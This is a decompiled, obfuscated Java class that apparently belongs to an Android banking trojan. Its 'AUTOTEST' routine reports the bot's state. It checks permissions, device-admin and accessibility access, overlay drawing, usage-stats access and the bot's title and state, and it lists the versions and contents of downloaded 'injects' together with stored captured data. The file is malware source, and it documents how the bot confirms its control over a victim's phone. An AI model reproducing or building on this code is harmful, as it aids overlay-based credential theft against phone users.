package fddo;

import android.content.Context;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.util.ArrayMap;

import com.sonnokta.p023w;
import com.sonnokta.p025i;
import com.sonnokta.p044i;
import com.sonnokta.p054v;
import com.sonnokta.p067x;
import com.sonnokta.utils.LogUtil;

import java.text.SimpleDateFormat;
import java.util.Iterator;
import java.util.Map;

import org.json.JSONObject;

public class ifdf {
    private static String TAG = "bwolf-ifdf";

    /* renamed from: fddo  reason: collision with root package name */
    private Context f123fddo;
    private p023w ifdf = null;

    public ifdf(Context context) {
        this.f123fddo = context;
    }

    /* renamed from: for  reason: not valid java name */
    private ArrayMap<String, String> m143for(String str) {
        LogUtil.showErrorLog(TAG, "--- m143for ---");
        ArrayMap<String, String> arrayMap = new ArrayMap<>();
        if (str.trim().isEmpty()) {
            return arrayMap;
        }
        for (String trim : str.split(";")) {
            String trim2 = trim.trim();
            if (!trim2.isEmpty()) {
                if (trim2.contains(":")) {
                    String[] split = trim2.split(":");
                    arrayMap.put(split[0], split[1]);
                } else {
                    arrayMap.put(trim2, "");
                }
            }
        }
        for (Map.Entry next : arrayMap.entrySet()) {
        }
        return arrayMap;
    }

    private String ifdf(String str) {
        LogUtil.showErrorLog(TAG, "--- ifdf ---");
        StringBuilder sb;
        if (str.isEmpty()) {
            return "";
        }
        String str2 = "";
        for (String str3 : str.split(",")) {
            if (!str3.trim().isEmpty()) {
                try {
                    str2 = str2 + str3 + ":\n";
                    JSONObject jSONObject = new JSONObject(Cthrow.m158new(this.f123fddo, "inj_" + str3, ""));
                    Iterator<String> keys = jSONObject.keys();
                    while (keys.hasNext()) {
                        String next = keys.next();
                        String obj = jSONObject.get(next).toString();
                        if (!next.equals("icon")) {
                            if (!next.equals("data")) {
                                if (!next.equals("cap_data") || obj.length() <= 256) {
                                    sb = new StringBuilder();
                                    sb.append(str2);
                                    sb.append("\t");
                                    sb.append(next);
                                    sb.append(" =  '");
                                    sb.append(obj);
                                    sb.append("'\n");
                                    str2 = sb.toString();
                                }
                            }
                        }
                        sb = new StringBuilder();
                        sb.append(str2);
                        sb.append("\t");
                        sb.append(next);
                        sb.append(" =  '<hidden ");
                        sb.append(obj.length());
                        sb.append(" bytes>'\n");
                        str2 = sb.toString();
                    }
                } catch (Exception e) {
                    str2 = str2 + str3 + ": " + e.getMessage();
                }
            }
        }
        return str2;
    }

    public String fddo() {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        StringBuilder sb = new StringBuilder();
        sb.append("SERVICES STATES:\np054v: ");
        sb.append(p054v.ifdf);
        if (p054v.f23for) {
            sb.append("; Foreground On");
        }
        sb.append("\np067x: ");
        sb.append(p067x.f27this);
        sb.append("\np044i: ");
        sb.append(p044i.ifdf);
        sb.append("\n");
        return sb.toString();
    }

    /* renamed from: new  reason: not valid java name */
    public void m144new(String str) {
        LogUtil.showErrorLog(TAG, "--- m144new ---");
        String replace = str.replace("iii", "info;prefs;smarts;");
        ArrayMap<String, String> arrayMap = m143for(replace);
        Cgoto.g(this.f123fddo, "===================AUTOTEST START: " + replace + "; Date: " + new SimpleDateFormat(Cbreak.fddo("5aa69a671186ebe7762aff157f342402f8b574")).format(Long.valueOf(System.currentTimeMillis())) + "===================\n");
        if (arrayMap.containsKey("info")) {
            Cgoto.g(this.f123fddo, fddo());
            String str2 = "";
            for (String str3 : p025i.fddo()) {
                str2 = str2 + "Perm " + str3 + ": " + (this.f123fddo.checkCallingOrSelfPermission(str3) == PackageManager.PERMISSION_GRANTED ? "Granted" : "Denied") + "\n";
            }
            StringBuilder sb = new StringBuilder();
            sb.append(((((str2 + "Hash: 02.11.23 14:41\n") + "Push admin: " + Cgoto.ifdf(this.f123fddo) + "\n") + "Acsb perm: " + Cgoto.dfhaefdhadfhdfherh(this.f123fddo) + "\n") + "Can write system settings: " + Cgoto.m114else(this.f123fddo) + "\n") + "Is optimizing battery: " + Cgoto.spkfgmhapoemghapfgmhadgkmhpda(this.f123fddo) + "\n");
            sb.append("p023w instance: ");
            p023w p023wV = p023w.f19while;
            sb.append(p023wV == null ? "NULL" : p023wV.toString());
            sb.append("\n");
            Cgoto.g(this.f123fddo, (((((((sb.toString() + "isXiaomi: " + Cgoto.grethwjrsfhj() + "\n") + "hasUsageStats: " + Cgoto.m139transient(this.f123fddo) + "\n") + "getUsageStatsCurrentPackage: " + Cgoto.m123interface(this.f123fddo) + "\n") + "getBotTitle: " + Cgoto.m133super(this.f123fddo) + "\n") + "getBotState: " + Cgoto.m116final(this.f123fddo) + "\n") + "canDrawOverlays: " + Settings.canDrawOverlays(this.f123fddo) + "\n") + "Injects bot version: " + Cthrow.ifdf(this.f123fddo, "bot_smarts_ver", -1) + "\n") + "Injects panel version: " + Cthrow.ifdf(this.f123fddo, "panel_smarts_ver", -1) + "\n");
        }
        if (arrayMap.containsKey("prefs")) {
            Cgoto.g(this.f123fddo, Cthrow.m160try(this.f123fddo, "no_injects_body"));
        }
        if (arrayMap.containsKey("smarts")) {
            String str4 = Cthrow.m158new(this.f123fddo, "smarts_injects", "");
            Cgoto.g(this.f123fddo, ((("\nSMARTS:\n" + "Injects bot version: " + Cthrow.ifdf(this.f123fddo, "bot_smarts_ver", -1) + "\n") + "Injects panel version: " + Cthrow.ifdf(this.f123fddo, "panel_smarts_ver", -1) + "\n") + "Injects downloaded: " + str4 + "\n") + ifdf(str4));
        }
    }
}
